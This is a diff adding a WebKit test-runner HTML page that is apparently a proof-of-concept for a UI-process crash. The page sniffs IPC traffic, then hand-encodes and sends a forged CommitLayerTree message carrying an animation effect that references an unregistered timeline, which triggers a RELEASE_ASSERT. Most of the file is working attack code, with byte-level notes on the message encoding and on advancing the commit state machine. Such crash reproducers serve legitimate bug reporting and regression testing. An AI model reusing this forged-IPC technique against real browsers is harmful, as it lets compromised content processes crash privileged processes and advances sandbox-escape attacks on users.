@@ -1,0 +1,506 @@
+<!DOCTYPE html><!-- webkit-test-runner [ IPCTestingAPIEnabled=true ] -->
+<html>
+<head><title>inv009-gpu H10: RemoteLayerTreeNode RELEASE_ASSERT on unregistered timeline</title></head>
+<body>
+<pre id="out"></pre>
+<script>
+// =============================================================================
+// H10: RemoteLayerTreeNode::setAcceleratedEffectsAndBaseValues RELEASE_ASSERT
+//      on effect referencing an unregistered timeline.
+// =============================================================================
+//
+// Target: UIProcess/RemoteLayerTree/RemoteLayerTreeNode.mm:434-436
+//
+//   Ref animationStack = RemoteAnimationStack::create(effects.map([&](...) {
+//       TimelineID timelineID { effect->timelineIdentifier(), m_layerID.processIdentifier() };
+//       RefPtr timeline = host.timeline(timelineID);
+//       RELEASE_ASSERT(timeline, "Remote layer tree animations should have a pre-registered timeline.");
+//
+// Path (UIProcess):
+//   DrawingAreaProxy::commitLayerTree
+//     -> commitLayerTreeTransaction (per RootFrameData)
+//       -> RemoteLayerTreeHost::updateLayerTree
+//         -> [timelines registered from transaction.timelinesUpdate()  L205, ONLY if !isEmpty()]
+//         -> for each changedLayer: RemoteLayerTreePropertyApplier::applyProperties  L225
+//           -> if (AnimationsChanged && threadedAnimationsEnabled())  L516-520
+//             -> node->setAcceleratedEffectsAndBaseValues  <-- RELEASE_ASSERT
+//
+// Reach conditions:
+//   - threadedAnimationsEnabled()  = threadedScrollDrivenAnimationsEnabled (default TRUE)
+//   - bundle.transactions[i].first.changedLayerProperties() has 1 entry with:
+//     - layerID resolves to an existing RemoteLayerTreeNode (else: log+continue, non-fatal)
+//     - LayerChange::AnimationsChanged bit set (1<<5 = 32)
+//     - animationChanges.effects non-empty
+//     - effects[0].timelineIdentifier() NOT in host.m_timelines
+//   - bundle.transactions[i].first.timelinesUpdate() is EMPTY (so no timelines registered)
+//
+// Blocker: CommitLayerTree is sent from m_commitQueue (background dispatch_queue)
+//   after the encoder is built on the main thread. Connection::sendMessage gates
+//   willSendMessage observers on isMainRunLoop() (Connection.cpp:596). So we
+//   CANNOT sniff the legitimate commit. Hand-encode is the only path.
+//
+// State-machine protocol (RemoteLayerTreeDrawingAreaProxy.mm:286-344):
+//   - UI tracks pendingCommits deque. didRefreshDisplay inserts {N, NotifyPending}
+//     at front, sends DisplayDidRefresh to WebProcess.
+//   - WebProcess responds:
+//       no work -> NotifyPending(nullopt) -> [0] stays NotifyPending, callbacks pause
+//       work    -> NotifyPending(N) -> NotifyFlushing(N) -> CommitLayerTree(bundle.tid=N)
+//   - CommitLayerTree MESSAGE_CHECKs:
+//       pendingCommits.size()
+//       pendingCommits.last().pendingMessage == CommitLayerTree
+//       pendingCommits.last().transactionID == bundle.transactionID
+//       bundle.transactionID == committedLayerTreeTransactionID->next()
+//
+// Strategy:
+//   1. Observe NotifyFlushing(N) on main thread (IS observable). Track last N.
+//   2. Observe NotifyPending(nullopt) -> quiescence. UI state now:
+//        pendingCommits[0] = {N+1, NotifyPending, IntentionallyDeferred}
+//        committedLayerTreeTransactionID = N
+//   3. Send our own: NotifyPending({N+1,P}) -> NotifyFlushing({N+1,P}) -> CommitLayerTree(bundle)
+//      where bundle.transactionID = {N+1, P} and bundle carries an effect with
+//      timelineIdentifier=99999 targeting layer 1 (the root, guaranteed to exist).
+//
+// Wire encodings (from source, ArgumentCoders.h + *.serialization.in):
+//   Vector<T>           uint64 size, then elements
+//   HashMap<K,V>        uint32 size, then (K, V) pairs
+//   HashSet<T>          uint32 size, then elements
+//   OptionSet<E:T>      raw T (uint64/uint16/...)
+//   optional<T>         bool has, [T if has]
+//   Markable<T>         bool isEmpty, [T if !isEmpty]   <-- INVERTED sense vs optional
+//   RefPtr<T>           bool has, [T if has]
+//   Ref<T>              T (no prefix)
+//   unique_ptr<T>       bool has, [T if has]
+//   UniqueRef<T>        T (no prefix)
+//   Variant<A,B,...>    uint8 index, then selected alternative
+//   pair<A,B>           A then B
+//   Seconds             double
+//   MonotonicTime       double
+//   IntSize/IntPoint    int32 x/w, int32 y/h
+//   FloatPoint          float x, float y
+//   PlatformLayerIdentifier = ProcessQualified = {uint64 object, uint64 processID}
+//   TransactionID       = ProcessQualified<TransactionIdentifier> = {uint64, uint64}
+//   TimelineIdentifier  = ObjectIdentifier<> = uint64
+//   ChangedLayers       custom: uint32 count, count*(PlatformLayerIdentifier, LayerProperties)
+//   LayerProperties     [OptionalTupleBits]: uint64 bitmask, then ONLY fields whose bit is set
+//
+// Expected: WKTR exit 133, crash log with setAcceleratedEffectsAndBaseValues in backtrace.
+// =============================================================================
+
+const out = document.getElementById("out");
+function log(s) { out.textContent += s + "\n"; }
+if (window.testRunner) { testRunner.dumpAsText(); testRunner.waitUntilDone(); }
+
+(async () => {
+    if (!window.IPC) { log("FAIL: no IPC"); return testRunner?.notifyDone(); }
+
+    const CLT = IPC.messages.RemoteLayerTreeDrawingAreaProxy_CommitLayerTree.name;
+    const NPC = IPC.messages.RemoteLayerTreeDrawingAreaProxy_NotifyPendingCommitLayerTree.name;
+    const NFL = IPC.messages.RemoteLayerTreeDrawingAreaProxy_NotifyFlushingLayerTree.name;
+    log("[*] CLT=" + CLT + " NPC=" + NPC + " NFL=" + NFL);
+
+    // ------------------------------------------------------------------------
+    // Step 0: runtime sanity -- dump serialized layout of key types
+    // ------------------------------------------------------------------------
+    const ti = IPC.serializedTypeInfo;
+    function dumpTI(name) {
+        if (ti[name]) log("  ti[" + name + "] = " + JSON.stringify(ti[name]));
+    }
+    log("[*] Type-info cross-check:");
+    dumpTI("WebKit::RemoteLayerTreeTransaction");
+    dumpTI("WebKit::LayerProperties::AnimationChanges");
+    dumpTI("WebCore::AcceleratedEffect");
+    dumpTI("WebCore::AnimationEffectTiming");
+    dumpTI("WebCore::AcceleratedEffectValues");
+    dumpTI("WebCore::AcceleratedTimelinesUpdate");
+    log("");
+
+    // ------------------------------------------------------------------------
+    // Step 1: sniff NotifyFlushing / NotifyPending for transactionID + destID
+    // ------------------------------------------------------------------------
+    let destID = null;
+    let lastFlushN = null;      // TransactionIdentifier object (uint64)
+    let procID    = null;       // ProcessIdentifier        (uint64)
+    let sawNulloptPending = false;
+    let sawOurOwn = false;      // ignore our own injected messages
+
+    IPC.addOutgoingMessageListener("UI", (msg) => {
+        if (sawOurOwn) return;  // stop observing once we start injecting
+        if (msg.name === NFL) {
+            // NotifyFlushing(TransactionID) = {u64 object, u64 processID}
+            // buffer: 16B header + u64@16 + u64@24 = 32B
+            destID = msg.destinationID;
+            if (msg.buffer && msg.buffer.byteLength >= 32) {
+                const dv = new DataView(msg.buffer);
+                lastFlushN = dv.getBigUint64(16, true);
+                procID     = dv.getBigUint64(24, true);
+            }
+        } else if (msg.name === NPC) {
+            // NotifyPending(optional<TransactionID>) = bool@16 [+ padding + u64 + u64]
+            // nullopt: buffer = header(16) + bool(1) = 17B
+            // some:    buffer = header(16) + bool(1) + pad(7) + u64(8) + u64(8) = 40B
+            if (msg.buffer && msg.buffer.byteLength <= 24) {
+                // <=24 catches 17 (aligned nullopt) safely
+                sawNulloptPending = true;
+            }
+        }
+    });
+
+    // Force a few paints to populate state, then stop touching DOM entirely.
+    document.body.style.backgroundColor = "#111";
+    document.body.offsetHeight;
+    await new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)));
+    document.body.style.backgroundColor = "#222";
+    await new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)));
+    // Now go quiet. Wait for the WebProcess to send NotifyPending(nullopt).
+    // Observer is async (RunLoop::dispatch) so poll.
+    for (let i = 0; i < 100 && !sawNulloptPending; i++) {
+        await new Promise(r => setTimeout(r, 30));
+    }
+
+    if (lastFlushN === null || procID === null || destID === null) {
+        log("BLOCKED: never sniffed NotifyFlushing; remote-layer-tree mode off?");
+        log("  lastFlushN=" + lastFlushN + " procID=" + procID + " destID=" + destID);
+        return testRunner?.notifyDone();
+    }
+    if (!sawNulloptPending) {
+        log("WARN: never saw NotifyPending(nullopt) -- proceeding anyway, may race real commit");
+    }
+
+    log("[*] Sniffed: destID=" + destID + " lastFlushN=" + lastFlushN +
+        " procID=" + procID + " quiescent=" + sawNulloptPending);
+
+    // Next transactionID to claim. TransactionID.next() = object+1, same processID.
+    const nextN = lastFlushN + 1n;
+    const nextN_num = Number(nextN);          // safe: small monotonic counter
+    const procID_num = Number(procID);        // ProcessIdentifier, small
+
+    // We CANNOT target an existing layer without sniffing -- nodeForID({1..8,P})
+    // all MISS (verified: crash lands in commitScrollingTreeState instead of H10,
+    // meaning updateLayerTree fell through both changedLayers loops via
+    // `if(!node){log;continue;}`). Release build: ASSERT(node)@L181/L214 is no-op.
+    //
+    // Instead: CREATE our own layer in THIS message. RemoteLayerTreeHost.mm:159
+    // iterates m_createdLayers BEFORE the changedLayers loops (L179, L209).
+    // createLayer(LayerTypeLayer) -> createWithPlainLayer -> m_nodes.add.
+    // Then L213 nodeForID({FAKE,P}) HITS our just-created node.
+    //
+    // Use a high ID to avoid ASSERT(!m_nodes.contains) on stock-debug (no-op here).
+    const targetLayerObj = 999999;
+
+    // --- LayerCreationProperties ---  RemoteLayerTree.serialization.in:151
+    //   Markable<PlatformLayerIdentifier> layerID   bool isEmpty=FALSE, {u64 obj, u64 proc}
+    //   PlatformCALayerLayerType type               uint8 (0=LayerTypeLayer, PlatformCALayer.h:87-88)
+    //   optional<VideoElementData> videoElementData bool false
+    //   Variant<NoAdditionalData,CustomData,...>    uint8 0  (NoAdditionalData = empty struct)
+    //   NoAdditionalData is index 0 in ALL three #if branches -> safe regardless of MODEL_ELEMENT/MODEL_PROCESS.
+    //   LayerTypeLayer -> RemoteLayerTreeHost.mm:431->447 createWithPlainLayer() -- simplest path.
+    const layerCreationProps = [
+        { type: "bool",     value: 0 },              // Markable isEmpty=FALSE  (layer ID is ENGAGED)
+        { type: "uint64_t", value: targetLayerObj }, // layerID.object
+        { type: "uint64_t", value: procID_num },     // layerID.processID
+        { type: "uint8_t",  value: 0 },              // type = LayerTypeLayer
+        { type: "bool",     value: 0 },              // videoElementData = nullopt
+        { type: "uint8_t",  value: 0 },              // additionalData = Variant idx 0 (NoAdditionalData)
+    ];
+
+    // ------------------------------------------------------------------------
+    // Step 2: build the hand-encoded CommitLayerTree body
+    //
+    // CommitLayerTree(RemoteLayerTreeCommitBundle, HashMap<IBSid, uptr<BSBH>>)
+    //
+    // RemoteLayerTreeCommitBundle {
+    //   Vector<RootFrameData> transactions;         // 1 entry
+    //   PageData pageData;                          // {[], 0}
+    //   optional<MainFrameData> mainFrameData;      // nullopt
+    //   TransactionID transactionID;                // {nextN, procID}
+    //   MonotonicTime startTime;                    // 0.0
+    // }
+    // ------------------------------------------------------------------------
+    sawOurOwn = true;   // stop reacting to our own injected NPC/NFL below
+
+    // --- WebAnimationTime = {optional<Seconds> time, optional<double> percentage}
+    //     WebAnimationTime.cpp:37-48 ctor REQUIRES exactly one engaged:
+    //       ASSERT(time || percentage);       // at least one
+    //       ASSERT(!!time != !!percentage);   // exactly one
+    //       else-branch: m_value = *percentage;  // unchecked deref (inv008-class bug)
+    //     On ASAN builds the first ASSERT fires with (nullopt, nullopt) during DECODE,
+    //     BEFORE any MESSAGE_CHECK. That's a separate finding (see crash-h10bonus-*.ips).
+    //     To get past it and reach H10 proper, send {Some(Seconds(0)), nullopt}.
+    //     Seconds wire = double. optional<Seconds> = bool true + double.
+    const WAT_ZERO = [
+        { type: "bool",   value: 1 },   // time.has_value = true
+        { type: "double", value: 0.0 }, // time.value (Seconds = double)
+        { type: "bool",   value: 0 },   // percentage.has_value = false
+    ];
+
+    // --- AnimationEffectTiming ---
+    //   RefPtr<TimingFunction> timingFunction;        bool false
+    //   FillMode fill;                                uint8 (0=None)
+    //   PlaybackDirection direction;                  uint8 (0=Normal)
+    //   double iterationStart;
+    //   double iterations;
+    //   WebAnimationTime x6 (startDelay, endDelay, iterationDuration,
+    //                        intrinsicIterationDuration, activeDuration, endTime)
+    const timing = [
+        { type: "bool",    value: 0 },    // timingFunction = null
+        { type: "uint8_t", value: 0 },    // fill = None
+        { type: "uint8_t", value: 0 },    // direction = Normal
+        { type: "double",  value: 0.0 },  // iterationStart
+        { type: "double",  value: 1.0 },  // iterations
+        ...WAT_ZERO,                      // startDelay
+        ...WAT_ZERO,                      // endDelay
+        ...WAT_ZERO,                      // iterationDuration
+        ...WAT_ZERO,                      // intrinsicIterationDuration
+        ...WAT_ZERO,                      // activeDuration
+        ...WAT_ZERO,                      // endTime
+    ];
+
+    // --- AcceleratedEffect ---  [RefCounted] -> Ref<> -> no bool prefix
+    //   AnimationEffectTiming timing;
+    //   TimelineIdentifier timelineIdentifier;       uint64  <-- 99999 = NOT REGISTERED
+    //   Vector<Keyframe> keyframes;                  uint64 0
+    //   WebAnimationType animationType;              uint8 (0=CSSAnimation)
+    //   CompositeOperation compositeOperation;       uint8 (0=Replace)
+    //   RefPtr<TimingFunction> defaultKTF;           bool false
+    //   OptionSet<AcceleratedEffectProperty:u16> animatedProperties; uint16 (2=Opacity, bit0=Invalid NOT serialized!)
+    //   bool paused;
+    //   double playbackRate;
+    //   optional<WebAnimationTime> startTime;        bool false
+    //   optional<WebAnimationTime> holdTime;         bool false
+    const acceleratedEffect = [
+        ...timing,
+        { type: "uint64_t", value: 99999 },   // timelineIdentifier  <-- THE BUG VALUE
+        { type: "uint64_t", value: 0 },       // keyframes.size = 0
+        { type: "uint8_t",  value: 0 },       // animationType = CSSAnimation
+        { type: "uint8_t",  value: 0 },       // compositeOperation = Replace
+        { type: "bool",     value: 0 },       // defaultKeyframeTimingFunction = null
+        { type: "uint16_t", value: 2 },       // animatedProperties = Opacity (1<<1). bit0=Invalid is NOT in serialization.in's [OptionSet] list -> isValidOptionSet() rejects 1!
+        { type: "bool",     value: 0 },       // paused = false
+        { type: "double",   value: 1.0 },     // playbackRate
+        { type: "bool",     value: 0 },       // startTime = nullopt
+        { type: "bool",     value: 0 },       // holdTime = nullopt
+    ];
+
+    // --- AcceleratedEffectValues ---
+    //   AcceleratedEffectOpacity {float}                     float
+    //   optional<TransformOperationData>                     bool false
+    //   AcceleratedEffectTransformOrigin {FloatPoint}        float, float
+    //   AcceleratedEffectTransformBox : uint8                uint8 (0=StrokeBox)
+    //   TransformOperations {Vector<Ref<TransformOp>>}       uint64 0
+    //   RefPtr<TransformOp> translate                        bool false
+    //   RefPtr<TransformOp> scale                            bool false
+    //   RefPtr<TransformOp> rotate                           bool false
+    //   RefPtr<PathOp> offsetPath                            bool false
+    //   AcceleratedEffectOffsetDistance {float}              float
+    //   AcceleratedEffectOffsetPosition {Variant<Normal,Auto,FP>}  uint8 0  (Normal=empty struct)
+    //   AcceleratedEffectOffsetAnchor {optional<FloatPoint>} bool false
+    //   AcceleratedEffectOffsetRotate {bool,float}           bool, float
+    //   FilterOperations {Vector<Ref<FilterOp>>}             uint64 0
+    //   FilterOperations                                     uint64 0
+    const effectValues = [
+        { type: "float",    value: 1.0 },     // opacity.value
+        { type: "bool",     value: 0 },       // transformOperationData = nullopt
+        { type: "float",    value: 0.0 },     // transformOrigin.value.x
+        { type: "float",    value: 0.0 },     // transformOrigin.value.y
+        { type: "uint8_t",  value: 0 },       // transformBox = StrokeBox
+        { type: "uint64_t", value: 0 },       // transform.m_operations.size = 0
+        { type: "bool",     value: 0 },       // translate = null
+        { type: "bool",     value: 0 },       // scale = null
+        { type: "bool",     value: 0 },       // rotate = null
+        { type: "bool",     value: 0 },       // offsetPath = null
+        { type: "float",    value: 0.0 },     // offsetDistance.value
+        { type: "uint8_t",  value: 0 },       // offsetPosition.value = Variant idx 0 (Normal, empty)
+        { type: "bool",     value: 0 },       // offsetAnchor.value = nullopt
+        { type: "bool",     value: 0 },       // offsetRotate.hasAuto
+        { type: "float",    value: 0.0 },     // offsetRotate.angle
+        { type: "uint64_t", value: 0 },       // filter.m_operations.size = 0
+        { type: "uint64_t", value: 0 },       // backdropFilter.m_operations.size = 0
+    ];
+
+    // --- AnimationChanges ---
+    //   Vector<pair<String, PlatformCAAnimationRemoteProperties>> addedAnimations;   uint64 0
+    //   HashSet<String> keysOfAnimationsToRemove;                                    uint32 0
+    //   Vector<Ref<AcceleratedEffect>> effects;                                      uint64 1, [effect]
+    //   AcceleratedEffectValues baseValues;
+    const animationChanges = [
+        { type: "uint64_t", value: 0 },       // addedAnimations.size
+        { type: "uint32_t", value: 0 },       // keysOfAnimationsToRemove.size
+        { type: "uint64_t", value: 1 },       // effects.size = 1
+        ...acceleratedEffect,                 // effects[0]  (Ref<> = no bool prefix)
+        ...effectValues,                      // baseValues
+    ];
+
+    // --- LayerProperties ---  [LegacyPopulateFromEmptyConstructor, OptionalTupleBits]
+    //   OptionSet<LayerChange:u64> changedProperties;   uint64 32  (AnimationsChanged = 1<<5)
+    //   then ONLY fields whose bit is set, in .serialization.in declaration order.
+    //   With only AnimationsChanged set, only `animationChanges` is encoded.
+    const layerProperties = [
+        { type: "uint64_t", value: 32 },      // changedProperties = AnimationsChanged
+        ...animationChanges,                  // [OptionalTupleBit=AnimationsChanged]
+    ];
+
+    // --- ChangedLayers ---  [CustomEncoder] RemoteLayerTreeTransaction.mm:424
+    //   encoder << instance.changedLayers.size();    // HashSet::size() -> unsigned = uint32
+    //   for each: encoder << layerID << properties;
+    //   Decodes on UI side as HashMap<PlatformLayerIdentifier, UniqueRef<LayerProperties>>
+    //   -> uint32 count + count * (PlatformLayerIdentifier + LayerProperties)
+    //   PlatformLayerIdentifier = {uint64 object, uint64 processID}
+    //   UniqueRef<T> = just T (no bool prefix)
+    const changedLayers = [
+        { type: "uint32_t", value: 1 },              // 1 entry
+        { type: "uint64_t", value: targetLayerObj }, // key.object  (guess: layer 1)
+        { type: "uint64_t", value: procID_num },     // key.processID
+        ...layerProperties,                          // value (UniqueRef<LayerProperties> = direct)
+    ];
+
+    // --- AcceleratedTimelinesUpdate ---
+    //   HashSet<Ref<AcceleratedTimeline>> created;     uint32 0
+    //   HashSet<Ref<AcceleratedTimeline>> modified;    uint32 0
+    //   HashSet<TimelineIdentifier> destroyed;         uint32 0
+    //   EMPTY -> timelinesUpdate().isEmpty() -> skip registration entirely (L205 gate)
+    const timelinesUpdate = [
+        { type: "uint32_t", value: 0 },
+        { type: "uint32_t", value: 0 },
+        { type: "uint32_t", value: 0 },
+    ];
+
+    // --- RemoteLayerTreeTransaction ---  [LegacyPopulateFromEmptyConstructor, DisableMissingMemberCheck]
+    //   Markable<PlatformLayerIdentifier> m_rootLayerID;        bool isEmpty=true
+    //   ChangedLayers m_changedLayers;
+    //   Markable<LayerHostingContextIdentifier> m_remoteContextHostedIdentifier;  bool isEmpty=true
+    //   Vector<LayerCreationProperties> m_createdLayers;        uint64 0
+    //   Vector<PlatformLayerIdentifier> m_destroyedLayerIDs;    uint64 0
+    //   Vector<PlatformLayerIdentifier> m_layerIDsWithNewlyUnreachableBackingStore;  uint64 0
+    //   IntSize m_contentsSize;                                 int32, int32
+    //   IntSize m_scrollGeometryContentSize;                    int32, int32
+    //   IntPoint m_scrollOrigin;                                int32, int32
+    //   IntPoint m_scrollPosition;                              int32, int32
+    //   AcceleratedTimelinesUpdate m_timelinesUpdate;           (3 x uint32 0)
+    const remoteLayerTreeTransaction = [
+        { type: "bool",     value: 1 },       // m_rootLayerID: Markable isEmpty = true (empty)
+        ...changedLayers,                     // m_changedLayers
+        { type: "bool",     value: 1 },       // m_remoteContextHostedIdentifier: isEmpty = true
+        { type: "uint64_t", value: 1 },       // m_createdLayers.size = 1  <-- CREATE THE LAYER FIRST
+        ...layerCreationProps,                // m_createdLayers[0] -- populates m_nodes BEFORE changedLayers loop
+        { type: "uint64_t", value: 0 },       // m_destroyedLayerIDs.size
+        { type: "uint64_t", value: 0 },       // m_layerIDsWithNewlyUnreachableBackingStore.size
+        { type: "int32_t",  value: 0 },       // m_contentsSize.width
+        { type: "int32_t",  value: 0 },       // m_contentsSize.height
+        { type: "int32_t",  value: 0 },       // m_scrollGeometryContentSize.width
+        { type: "int32_t",  value: 0 },       // m_scrollGeometryContentSize.height
+        { type: "int32_t",  value: 0 },       // m_scrollOrigin.x
+        { type: "int32_t",  value: 0 },       // m_scrollOrigin.y
+        { type: "int32_t",  value: 0 },       // m_scrollPosition.x
+        { type: "int32_t",  value: 0 },       // m_scrollPosition.y
+        ...timelinesUpdate,                   // m_timelinesUpdate (EMPTY -> no timelines registered)
+    ];
+
+    // --- RemoteScrollingCoordinatorTransaction ---
+    //   unique_ptr<ScrollingStateTree> scrollingStateTree;   bool false
+    //   bool clearScrollLatching;
+    //   optional<FrameIdentifier> rootFrameIdentifier;       bool false
+    const scrollingCoordinatorTransaction = [
+        { type: "bool", value: 0 },           // scrollingStateTree = null
+        { type: "bool", value: 0 },           // clearScrollLatching
+        { type: "bool", value: 0 },           // rootFrameIdentifier = nullopt
+    ];
+
+    // --- RootFrameData = pair<RemoteLayerTreeTransaction, RemoteScrollingCoordinatorTransaction>
+    // pair<A,B> = A then B, no prefix
+    const rootFrameData = [
+        ...remoteLayerTreeTransaction,
+        ...scrollingCoordinatorTransaction,
+    ];
+
+    // --- PageData ---
+    //   Vector<AsyncReplyID> callbackIDs;    uint64 0
+    //   uint64_t renderTreeSize;
+    const pageData = [
+        { type: "uint64_t", value: 0 },       // callbackIDs.size
+        { type: "uint64_t", value: 0 },       // renderTreeSize
+    ];
+
+    // --- RemoteLayerTreeCommitBundle ---
+    //   Vector<RootFrameData> transactions;          uint64 1, [rootFrameData]
+    //   PageData pageData;
+    //   optional<MainFrameData> mainFrameData;       bool false
+    //   TransactionID transactionID;                 {uint64, uint64}
+    //   MonotonicTime startTime;                     double
+    const bundle = [
+        { type: "uint64_t", value: 1 },       // transactions.size = 1
+        ...rootFrameData,                     // transactions[0]
+        ...pageData,                          // pageData
+        { type: "bool",     value: 0 },       // mainFrameData = nullopt
+        { type: "uint64_t", value: nextN_num },   // transactionID.object = N+1
+        { type: "uint64_t", value: procID_num },  // transactionID.processIdentifier
+        { type: "double",   value: 0.0 },     // startTime (MonotonicTime)
+    ];
+
+    // --- CommitLayerTree(bundle, handlesMap) ---
+    //   handlesMap = HashMap<ImageBufferSetIdentifier, unique_ptr<BufferSetBackendHandle>>
+    //              = uint32 0
+    const commitArgs = [
+        ...bundle,
+        { type: "uint32_t", value: 0 },       // handlesMap.size = 0
+    ];
+
+    log("[*] Built CommitLayerTree body: " + commitArgs.length + " primitives");
+    log("    transactionID = {" + nextN_num + ", " + procID_num + "}");
+    log("    targetLayer   = {" + targetLayerObj + ", " + procID_num + "}");
+    log("    timelineID    = 99999  (NOT in m_timelines)");
+    log("");
+
+    // ------------------------------------------------------------------------
+    // Step 3: advance the state machine, then send the forged commit
+    // ------------------------------------------------------------------------
+    const conn = IPC.connectionForProcessTarget("UI");
+
+    // NotifyPending(optional<TransactionID>) -- send Some({N+1, P})
+    // optional<T> = bool true + T. TransactionID = {u64, u64}.
+    const npcArgs = [
+        { type: "bool",     value: 1 },           // optional.has_value = true
+        { type: "uint64_t", value: nextN_num },   // object
+        { type: "uint64_t", value: procID_num },  // processID
+    ];
+
+    // NotifyFlushing(TransactionID) = {u64, u64}
+    const nflArgs = [
+        { type: "uint64_t", value: nextN_num },
+        { type: "uint64_t", value: procID_num },
+    ];
+
+    log("[*] Sending NotifyPending({" + nextN_num + "," + procID_num + "}) ...");
+    try { conn.sendMessage(destID, NPC, npcArgs); }
+    catch (e) { log("  NotifyPending threw: " + e); }
+
+    log("[*] Sending NotifyFlushing({" + nextN_num + "," + procID_num + "}) ...");
+    try { conn.sendMessage(destID, NFL, nflArgs); }
+    catch (e) { log("  NotifyFlushing threw: " + e); }
+
+    log("[*] Sending CommitLayerTree (forged bundle, " + commitArgs.length + " fields) ...");
+    try {
+        conn.sendMessage(destID, CLT, commitArgs);
+        log("[*] CommitLayerTree sent. If UI process crashed, WKTR will report #CRASHED.");
+    } catch (e) {
+        log("BLOCKED: CommitLayerTree encode/send threw: " + e);
+        log("  Encoding mismatch -- cross-check ti[...] dump above vs source layout.");
+    }
+
+    // Give UI process a moment to process & die.
+    await new Promise(r => setTimeout(r, 500));
+
+    // If we're still here, the single-shot failed. With layer creation in-message
+    // there's no layer-ID guesswork left -- remaining failure modes are:
+    //   - threadedAnimationsEnabled() false at runtime (gate at PropertyApplier)
+    //   - state-machine race (real commit beat our NPC/NFL, tid mismatch -> MESSAGE_CHECK drop)
+    //   - decode failure (serialized-enum value validation rejected something silently)
+    // No retry: the bundle is deterministic. Either it works or the encoding is wrong.
+    log("");
+    log("NO-CRASH: UI process survived. Check Console.app for MESSAGE_CHECK drops");
+    log("or 'failed to find layer' (would indicate createLayer failed).");
+
+    testRunner?.notifyDone();
+})().catch(e => { log("EXCEPTION: " + e + "\n" + (e?.stack || "")); testRunner?.notifyDone(); });
+</script>
+</body>
+</html>
